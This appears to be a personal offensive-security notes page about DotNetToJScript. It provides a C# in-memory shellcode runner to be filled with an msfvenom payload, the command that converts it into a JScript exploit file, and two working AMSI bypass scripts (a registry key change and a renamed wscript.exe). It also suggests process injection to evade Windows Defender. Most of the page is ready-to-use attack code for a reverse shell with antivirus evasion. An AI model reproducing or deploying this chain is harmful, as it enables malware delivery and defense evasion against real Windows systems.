---
layout:     post
author:     0x5c4r3
type: docs
permalink: DotNetToJS
---


<span style="font-size: 35px; color:red"><b>DotNetToJS</b></span>

https://github.com/tyranid/DotNetToJScript

Execute C# assembly from Jscript.

Jscript shellcode runner in memory using DotNetToJScript:
Start from DotNetToJScript's file called <span style="color:red">ExampleAssembly/TestClass.cs</span>.
Create payload with msfvenom payload as x64 csharp, compile on VS as x64 DLL.

```cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public TestClass()

    {
        byte[] buf = new byte[647] {0xfc,0x48,0x83,0xe4,0xf0,0xe8, //... you can add in column, no problem

        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
  
    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

Put DotNetToJScript.exe, ExampleAssembly.dll (the output file from above) and NDesk.Options.dll in the same folder and from shell run:
```shell
DotNetToJScript.exe <INPUT_DLL> --lang=Jscript --ver=v4 -o <OUTPUT_JS>
```

It will output a .js that you can use as exploit file.

<span style="font-size: 25px; color:white"><b>AMSI Bypass</b></span>

Jscript tries to query the "AmsiEnable" registry key from the HKCU hive before initializing AMSI. If this key is set to "0", AMSI is not enabled for the Jscript process.
You can add this to the original .js exploit outputted from the method above to have a fully functional revshell with AMSI bypass.

```js
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD");
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}
```

OR

```js
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
	{
		throw new Error(1, '');
	}
}
catch(e)
{
	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
	WScript.Quit(1);
}
```
This last one might be flagged bi WinDef, but we can use it and immediately migrate the process or perform process injection or hollowing.
